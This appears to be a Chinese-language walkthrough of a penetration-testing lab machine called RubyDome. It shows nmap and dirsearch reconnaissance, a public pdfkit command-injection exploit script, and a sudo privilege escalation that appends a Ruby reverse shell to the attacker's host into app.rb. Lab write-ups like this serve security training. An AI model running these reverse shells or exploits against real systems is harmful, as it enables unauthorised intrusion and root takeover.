针对目标服务器进行相应的端口探测

```
sudo nmap -p- -vvv --min-rate 10000 192.168.131.22
```

![image-20241128212916376](https://s2.loli.net/2024/11/28/FgMCWm4Br5E3lsw.png)

针对开放的端口进行相应的服务探测

```
sudo nmap -p22,3000 -A 192.168.131.22 -oG RubyDome.txt
```

![image-20241128212934300](https://s2.loli.net/2024/11/28/EDrCVg3JtYipjo7.png)

22端口没有可以直接利用的漏洞等内容，我们重点关注3000端口的开放服务

我们针对目录进行扫描

```
dirsearch -u http://192.168.131.22:3000/
```

扫描没有任何结果，突破点应当是在漏洞，或者内容输入上

我们尝试在本地打开一个链接

```
http://192.168.45.211/RubyDome.txt
```

![image-20241128214814728](https://s2.loli.net/2024/11/28/iVPfhgRGKNYpnXO.png)

实际会有一个情况，我们尝试来一个本地的反弹shell，使用php会存在报错

![image-20241128220831087](https://s2.loli.net/2024/11/28/UbstOKav8cdPAxg.png)

查看报错信息，貌似是一个pdfkit的工具在处理pdf文件，我们搜索是否存在漏洞

![image-20241128222746267](https://s2.loli.net/2024/11/28/gCDMJxysaGrkS1B.png)

看到有一个利用脚本几对应的命令注入漏洞，我们进行下载和查看

```
python3 51293.py -s 192.168.45.211 4444 -w "http://192.168.131.22:3000/pdf" -p url
```

通过web开发者工具，查看提交参数的inputid

```
echo "system("ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"192.168.45.211\",443))'")" >> app.rb
sudo /usr/bin/ruby /home/andrew/app/app.rb
```
